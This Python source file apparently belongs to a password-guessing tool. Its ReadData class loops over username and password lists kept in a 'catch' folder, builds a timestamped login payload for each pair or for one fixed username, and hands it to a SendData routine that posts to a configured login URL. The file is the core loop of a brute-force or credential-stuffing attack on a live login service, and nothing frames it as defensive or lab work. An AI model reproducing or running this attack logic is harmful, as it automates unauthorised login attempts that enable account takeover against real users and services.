from .sendData import SendData
from conf.urls import *
from conf.input import *
from datetime import datetime

class ReadData:
	def __init__(self, dir_name, username = ""):
		self.dir_name = dir_name
		self.username = username

	def read_data_combo(self):
		with open(f'{self.dir_name}/catch/username_list.txt','r') as f_u:
			for username in f_u:
				print(f"\n===== [ {username[:-1]} ] ===== ")
				with open(f'{self.dir_name}/catch/passwd_list.txt','r') as f_p:
					for password in f_p:
						time = str(int(datetime.now().timestamp()))
						payload = Payload(username[:-1],password[:-1],time).__dict__
						SendData(urls['login_url'], urls['linked'], payload, self.dir_name, password[:-1])

	def read_data(self):	
		with open(f'{self.dir_name}/catch/passwd_list.txt','r') as f_p:
			for password in f_p:		
				time = str(int(datetime.now().timestamp()))
				payload = Payload(self.username,password[:-1],time).__dict__
				SendData(urls['login_url'], urls['linked'], payload, self.dir_name, password[:-1])
